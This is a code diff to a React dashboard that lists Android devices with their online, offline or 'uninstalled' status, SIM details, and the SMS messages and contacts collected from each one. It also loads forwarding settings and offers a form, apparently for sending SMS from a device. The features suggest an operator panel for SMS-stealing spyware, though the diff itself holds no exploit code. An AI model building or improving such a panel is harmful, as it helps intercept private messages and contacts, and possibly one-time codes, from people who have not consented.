@@ -98,7 +98,10 @@ export default function App() {
           const d = sec.device || {}
           const id = d.device_id
           const open = openId === id
-          const online = d.last_seen && (Date.now() - new Date(d.last_seen).getTime()) < 120000
+          const lastMs = d.last_seen ? Date.now() - new Date(d.last_seen).getTime() : Infinity
+          const status = !d.last_seen ? 'UNINSTALLED' : lastMs < 120000 ? 'ONLINE' : lastMs < 3600000 ? 'OFFLINE' : 'UNINSTALLED'
+          const statusColor = status === 'ONLINE' ? '#22c55e' : status === 'OFFLINE' ? '#ef4444' : '#64748b'
+          const offlineStr = d.offline_seconds > 0 ? `Was offline ${Math.round(d.offline_seconds/60)}m` : ''
           const sims = parseSim(d.sim_info)
           const smsList = sec.sms || []
           const contactsList = sec.contacts || []
@@ -106,14 +109,18 @@ export default function App() {
 
           return (
             <div key={id} style={s.card}>
-              <div style={{...s.head, borderLeft:`4px solid ${online ? '#22c55e' : '#ef4444'}`}}
+              <div style={{...s.head, borderLeft:`4px solid ${statusColor}`}}
                 onClick={() => { setOpenId(open ? null : id); loadFwd(id); setActs(prev => ({...prev, [id]: prev[id]||{target_number:'',message:'',sim_slot:'1',type:'sms'}})) }}>
                 <div>
                   <div style={s.name}>
                     {d.device_name || '-'}
-                    <span style={{...s.badge, background: online ? '#22c55e' : '#ef4444'}}>{online ? 'ON' : 'OFF'}</span>
+                    <span style={{...s.badge, background: statusColor}}>{status}</span>
                   </div>
-                  <div style={s.sub}>{d.model || ''} &middot; Android {d.os_version || ''}</div>
+                  <div style={s.sub}>
+                    {d.model || ''} &middot; Android {d.os_version || ''}
+                    {d.last_seen ? ` &middot; ${new Date(d.last_seen).toLocaleString()}` : ''}
+                    {offlineStr ? ` &middot; ${offlineStr}` : ''}
+                  </div>
                 </div>
                 <span style={{fontSize:11,color:'#94a3b8'}}>{open ? '▲' : '▼'}</span>
               </div>
@@ -129,15 +136,25 @@ export default function App() {
                     </div>
                   ))}
 
-                  {/* SMS by SIM */}
+                  {/* SMS */}
                   <div style={{...s.secH,marginTop:12}}>SMS</div>
                   {smsList.length === 0 ? <div style={s.txt}>No SMS</div> : (
                     <div style={s.scroll}>
-                      {[1,2,3,4,5].map(slot =>
-                        smsList.filter(x => x.sub_id === slot || (!x.sub_id && slot === 1)).length > 0 && (
+                      {(() => {
+                        const slots = [...new Set(smsList.map(x => x.sub_id))].sort()
+                        if (slots.length === 1 && slots[0] === 0) {
+                          return smsList.map((x,j) => (
+                            <div key={x.id||j} style={s.item}>
+                              <div style={{fontWeight:600,fontSize:12}}>{x.sender||'-'}</div>
+                              <div style={{color:'#475569',wordBreak:'break-word',marginTop:1,fontSize:11}}>{x.message||'-'}</div>
+                              <div style={{fontSize:10,color:'#94a3b8',marginTop:1}}>{x.received_at?new Date(x.received_at).toLocaleString():'-'}</div>
+                            </div>
+                          ))
+                        }
+                        return slots.map(slot => (
                           <div key={slot}>
-                            <div style={{fontSize:11,fontWeight:600,color:'#64748b',padding:'4px 0'}}>SIM {slot} ({smsList.filter(x => x.sub_id === slot).length} messages)</div>
-                            {smsList.filter(x => x.sub_id === slot || (!x.sub_id && slot === 1)).map((x,j) => (
+                            <div style={{fontSize:11,fontWeight:600,color:'#64748b',padding:'4px 0'}}>SIM {slot === 0 ? '?' : slot} ({smsList.filter(x => x.sub_id === slot).length} messages)</div>
+                            {smsList.filter(x => x.sub_id === slot).map((x,j) => (
                               <div key={x.id||j} style={s.item}>
                                 <div style={{fontWeight:600,fontSize:12}}>{x.sender||'-'}</div>
                                 <div style={{color:'#475569',wordBreak:'break-word',marginTop:1,fontSize:11}}>{x.message||'-'}</div>
@@ -145,15 +162,8 @@ export default function App() {
                               </div>
                             ))}
                           </div>
-                        )
-                      )}
-                      {smsList.every(x => !x.sub_id) && smsList.map((x,j) => (
-                        <div key={x.id||j} style={s.item}>
-                          <div style={{fontWeight:600,fontSize:12}}>{x.sender||'-'}</div>
-                          <div style={{color:'#475569',wordBreak:'break-word',marginTop:1,fontSize:11}}>{x.message||'-'}</div>
-                          <div style={{fontSize:10,color:'#94a3b8',marginTop:1}}>{x.received_at?new Date(x.received_at).toLocaleString():'-'}</div>
-                        </div>
-                      ))}
+                        ))
+                      })()}
                     </div>
                   )}
 
